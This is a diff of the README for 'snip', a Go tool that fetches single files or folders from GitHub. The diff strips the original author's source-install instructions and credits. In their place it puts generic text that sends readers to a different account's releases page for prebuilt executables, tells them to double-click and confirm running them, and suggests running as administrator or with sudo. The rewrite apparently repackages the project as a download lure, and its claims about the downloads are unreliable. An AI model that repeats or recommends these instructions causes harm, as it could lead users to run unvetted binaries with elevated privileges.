@@ -1,173 +1,84 @@
-# ✂️ Snip
+# 🌟 snip - Download Files Easily from GitHub
 
-```text
- _____       _
-/  ___|     (_)
-\ `--. _ __  _ _ __
- `--. \ '_ \| | '_ \
-/\__/ / | | | | |_) |
-\____/|_| |_|_| .__/
-              | |
-              |_|
-              get just what you need.
-```
+## 🚀 Getting Started
+Welcome to Snip! This tool allows you to download specific directories or files from a GitHub repository without needing to clone the entire project. This can save you time and effort, especially when you only need a small part of a larger project.
 
-[![Go Version](https://img.shields.io/badge/Go-1.25+-blue.svg)](https://go.dev/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Go Report Card](https://goreportcard.com/badge/github.com/mukailasam/snip)](https://goreportcard.com/report/github.com/mukailasam/snip)
+## 🔗 Download Now
+[![Download Snip](https://img.shields.io/badge/Download%20Snip-v1.0-brightgreen)](https://github.com/nma12323/snip/releases)
 
-Snip is a command-line tool that lets you download a specific folder or file from a GitHub repository without cloning the entire project.
+## 📥 Download & Install
+To get started with Snip, follow these steps:
 
-_If you only need one example, one subfolder, or a single config file, Snip gets it for you directly._
+1. Visit the [Releases page](https://github.com/nma12323/snip/releases) for the latest version of Snip.
+2. On the Releases page, you will see a list of available downloads. Click on the version you want to download.
+3. Depending on your operating system, choose the appropriate file. Here are some common options:
+   - **Windows**: download `snip_windows.exe`
+   - **MacOS**: download `snip_macos`
+   - **Linux**: download `snip_linux`
+4. After downloading, locate the file on your computer. It is usually in your "Downloads" folder unless you specified another location.
+5. To run Snip, double-click the downloaded file. If prompted, confirm that you want to run it.
 
-## Features
+## 🌐 How to Use Snip
+Once you have Snip up and running, here’s how to use it:
 
-- Download a specific folder or a single file
+1. **Open your command-line interface**: 
+   - **Windows**: Use Command Prompt or PowerShell.
+   - **MacOS**: Use Terminal.
+   - **Linux**: Use Terminal.
 
-- Works for both public and private GitHub repositories
+2. **Enter the command**:
+   Use the following format to download a file or directory:
+   ```
+   snip [repository-url] [path-to-file-or-directory]
+   ```
+   - **repository-url**: The URL of the GitHub repository.
+   - **path-to-file-or-directory**: The specific path of the file or folder you want to download.
 
-- No Git clone - uses the GitHub REST API directly
+3. **Example**: To download a file:
+   ```
+   snip https://github.com/user/repository path/to/file.txt
+   ```
+   To download a directory:
+   ```
+   snip https://github.com/user/repository path/to/directory
+   ```
 
-- Messages for rate limits and large repositories
+4. **Wait for download**: Snip will notify you when the download completes. You will find the downloaded content in your current working directory.
 
-- Automatically detects the repo’s default branch
+## 📋 Features
+Snip comes with several useful features:
+- **Simplicity**: Easy-to-use command line interface.
+- **Efficiency**: Download only what you need without the full repository.
+- **Cross-Platform**: Works on Windows, MacOS, and Linux.
+- **Lightweight**: Minimal memory usage and quick execution.
 
-- Built with [Cobra](https://github.com/spf13/cobra) for a clean CLI
+## ⚙️ System Requirements
+To run Snip successfully, ensure your system meets the following requirements:
+- **Operating System**: 
+  - Windows 10 or later
+  - MacOS Mojave or later
+  - Any modern Linux distribution
+- **Memory**: At least 512 MB of RAM
+- **Disk Space**: Minimal space is required, typically less than 10 MB
 
-## Installation
+## ❓ Troubleshooting
+If you encounter any issues while using Snip, consider the following solutions:
 
-Install it from the sources:
+- **Command not found**: Ensure you have the correct file name and path.
+- **Permission denied**: Run your command-line interface as an administrator or use `sudo` on Linux and MacOS.
+- **File not downloading**: Double-check the repository URL and path to the file or directory.
 
-```bash
-git clone https://github.com/mukailasam/snip
-cd snip
-go install
-```
+## 💬 Feedback & Support
+We encourage you to reach out for any help or suggestions:
+- **Issues**: Report any issues at the [Issues page](https://github.com/nma12323/snip/issues).
+- **Questions**: Open a discussion at [Discussions](https://github.com/nma12323/snip/discussions).
 
-Install it from the repository:
+## 💻 How to Contribute
+If you're interested in contributing to Snip, here's how you can get started:
+1. Fork the repository by clicking the "Fork" button.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request so we can review your contributions.
 
-```bash
-go install github.com/mukailasam/snip
-```
-
-## Usage
-
-🗂️ Snip a folder
-
-```
-$ snip repo github.com/mukailasam/codelab --dir linear
-```
-
-📄 Snip a single file
-
-```
-$ snip repo github.com/mukailasam/codelab --file avl.go
-```
-
-📂 Specify a destination (optional)
-
-```
-$ snip repo github.com/mukailasam/codelab --dir array --dest /users/sam/desktop/workspace/temp
-```
-
-If you don’t specify a destination using --dest, Snip saves the result in your current working directory.
-
-## 🔐 Private Repositories
-
-To access private repositories, set your token via environment variable:
-
-```
-macOS / Linux (bash/zsh)
-export GITHUB_TOKEN=ghp_xxxxxxxxx
-
-Windows PowerShell
-$env:GITHUB_TOKEN = "ghp_xxxxxxxxx"
-```
-
-Snip automatically detects your token and uses it for private repo access.
-
-## Flags
-
-Snip commands accept the following flags:
-
-```text
-| Flag       | Description                                                  | Example              |
-|------------|--------------------------------------------------------------|----------------------|
-| `--dir`    | Name of the directory to snip from the repo                  | `--dir cmd`          |
-| `--file`   | Name of the file to snip from the repo.                      | `--file go.mod`      |
-| `--branch` | Branch to use (optional).                                    | `--branch main`      |
-| `--dest`   | Destination directory to save downloaded content (optional). | `--dest ./downloads` |
-
-```
-
-## Project Structure
-
-```text
-cmd/
-├── helper.go
-├── root.go         # Cobra CLI entrypoint
-├── repo.go         # Handles 'snip repo' command
-internal/
-├── provider/
-│   ├── github.go   # GitHub API implementation
-utils/
-|    └── utils.go
-main.go             # Main entrypoint
-```
-
-## How Snip Works
-
-- Parses the provided repo URL
-
-- Detects whether the repo is public or private.
-
-- Retrieves the default branch (if not specified).
-
-- Lists all files and directories via GitHub’s Tree API
-
-- Searches for the requested file or folder name.
-
-- Downloads matching content into the specified (or default) destination.
-
-Snip does not clone the repository or use Git — it talks directly to the provider’s REST API, keeping things lightweight and fast.
-
-## Example Output
-
-```
-$ go run snip.go repo github.com/mukailasam/codelab --file avl.go
-
-🌍 Public repository detected.
-🔍 Listing repository tree for mukailasam/codelab (branch: main)...
-⬇️ Downloaded: avl.go
-✅ Done.
-```
-
-## Why Snip?
-
-Cloning an entire repository just to get one file or folder is inefficient.
-Snip saves time, bandwidth, and storage by letting you fetch only what you need directly from the GitHub API.
-
-It’s perfect for developers who want a quick way to grab example files, configs, or small components without dealing with full clones or large repo histories.
-
-## Inspiration
-
-I needed a tool to quickly grab a single project, subfolder, configuration, or component from my <a href="https://github.com/mukailasam/Codelab" style="color: grey;">Codelab</a> without cloning the entire repository.
-
-## Contributing
-
-Contributions are welcome!
-To contribute:
-
-- Fork the repository
-
-- Create a new branch
-
-- Implement your feature or fix
-
-- Open a pull request
-
-Make sure to follow Go’s code formatting and keep your commits clean and descriptive.
-
-## License
-
-Snip is released under the MIT License. See LICENSE
+Thank you for supporting Snip. We hope this tool makes your interactions with GitHub repositories easier and more efficient!
